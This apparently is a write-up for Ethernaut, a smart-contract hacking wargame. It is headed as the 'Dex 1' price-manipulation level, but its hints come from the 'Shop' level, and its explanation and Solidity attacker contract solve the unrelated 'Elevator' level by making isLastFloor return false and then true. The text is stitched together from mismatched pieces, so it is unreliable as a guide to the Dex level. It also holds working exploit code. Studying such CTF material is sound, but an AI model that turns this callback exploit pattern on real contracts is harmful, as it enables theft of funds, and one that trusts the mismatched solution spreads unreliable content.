# Dex 1 Ethernaut

## Goals

=> Hack the basic DEX contract below and steal the funds by price manipulation.

=> You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.

=> Manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

### Hints

- Shop expects to be used from a Buyer
- Understanding restrictions of view functions

- So when looking at the goTo function you see you need to fullfill two conditions at first `building.isLastFloor(_floor)` needs to return false to get into the if case then `building.isLastFloor(_floor)` needs to return true to assign the value true to `top` all of this needs to be called by a "building" so I made a contract that takes the elevator contract address as input and implements the Building interface, from that contract I can call the `elevator.goTo()` with an arbitrary uint, which then calls back to my hack contract which will set the number to 0 (my floorCounter) which then gets increased by one `floorCounter++;`, the 0 gets evaluated to false through my ternary operator, the second time `building.isLastFloor(_floor)` is getting called we assign the now increased floorCounter as the new number so now it will return true thus top = true

### Attacker Contract

```solidity
contract Hack {
    Elevator public elevator;
    Building public building;
    uint private floorCounter;

    constructor(address _elevatorAddress) {
        building = Building(address(this));
        elevator = Elevator(_elevatorAddress);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        _floor = floorCounter;
        floorCounter++;
        return _floor == 0 ? false : true;
    }

    function attack() external {
        elevator.goTo(1234);
    }
}
```
